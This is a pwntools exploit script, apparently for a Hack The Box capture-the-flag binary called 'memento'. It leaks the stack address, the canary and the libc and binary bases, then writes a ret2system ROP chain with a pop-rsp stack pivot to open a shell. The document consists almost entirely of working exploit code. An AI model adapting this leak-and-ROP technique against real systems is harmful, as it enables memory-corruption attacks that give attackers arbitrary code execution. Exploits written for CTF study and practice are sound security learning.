#!/usr/bin/python3
"""
Writing ret2system ROP chain in the first 0x18 bytes of stackBuffer. 
Writing pop_rsp over saved return address of remember function to pivot the stack to the start of stackBuffer.
Works locally only
"""
from pwn import *

exe = ELF("memento", checksec=False)

context.binary = exe

context.terminal = ['tmux', 'splitw', '-h', '-p', '70', '-I']
context.log_level 	= "DEBUG"
isDebug = False

gs = '''
break main
break loop
break remember
break reset
break recall
brva 0x0000000000001248
disable
continue
'''.format(**locals())

def start_local(isDebug, argv=[], *a, **kw):
	if args.GDB:
		return gdb.debug([exe.path], gdbscript=gs)
	else:
		return process([exe.path], *a, **kw)

def printMsg(msg):
	if isDebug:
		print(msg)

def find_ip_offset(payload):
	io = process(elf.path)
	io.sendlineafter(b": ", payload)
	
	io.wait()
	
	#ip_offset = cyclic_find(io.corefile.pc) # x86
	ip_offset = cyclic_find(io.corefile.read(io.corefile.sp, 4))
	info("Located RIP offset at [%s]", ip_offset)
	return ip_offset

def remember(input1:bytes, input2:bytes):
	io.send(b"A")
	io.send(input1)
	# io.shutdown("send")
	io.send(input2)

def recall():
	io.send(b"B")
	result = io.recv()
	# printMsg(result.decode())
	return result

def reset():
	io.send(b"C")


#===========================================================
#                    EXPLOIT GOES HERE					   #
#===========================================================

######## LOCAL ########
io = start_local(isDebug)

io.timeout = 0.2

# access loop function when running local:
io.send(b"HTB{}")
remember(p8(0xff), p8(0xff)*0xff)
leak = recall()

# leak stackBuffer address
stack_buffer = u64(leak[32:40]) - 0x19

if stack_buffer & 0xff < 0x48 or stack_buffer & 0xff > 0xd0:
	print("stackBuffer is placed to close to 0x48. Bailing out.")
	print(f"{hex(stack_buffer)=}")
	exit()

# leak canary
canary = leak[40:48]

# leak libc base
ret_address_and_libc = leak[56:64]
libc_base = u64(ret_address_and_libc) - 0x27c8a

# leak binary
binary_leak = u64(leak[72:80])
binary_base = binary_leak - 0x13b0 
exe.address = binary_base

print(f"{hex(stack_buffer)=}")
print(f"{hex(u64(canary))=}")
print(f"{hex(u64(ret_address_and_libc))=}")
print(f"{hex(binary_leak)=}")
print(f"{hex(libc_base)=}")
print(f"{hex(binary_base)=}")


# exploit...
pop_rdi = libc_base + 0x0000000000028215
ret_address = pop_rdi + 1
system = libc_base + 0x000000000004dab0
bin_sh = libc_base + 0x197e34
pop_rsp = libc_base + 0x000000000002668b
retf_ret = libc_base + 0x00000000000b4e2e

rop_write_start_lsb = ((stack_buffer - 0x28) & 0xff) - 0x1
jump_overwrite_lsb = ((stack_buffer - 0x48) & 0xff) - 0x1
start_of_rop_address = stack_buffer - 0x28

over_write_start_print = stack_buffer - 0x28
jump_overwrite_print = stack_buffer + 0x48
start_of_rop_print = stack_buffer - 0x28

print(f"{hex(over_write_start_print)=}")
print(f"{hex(jump_overwrite_print)=}")
print(f"{hex(start_of_rop_print)=}")

reset()
pause()
remember(p8(0xff), p64(pop_rdi) + p64(bin_sh) + p64(system) + p64(0x0) + p8(jump_overwrite_lsb) + p64(pop_rsp) + p64(stack_buffer) + p8(0xdc) * 206)

io.interactive()
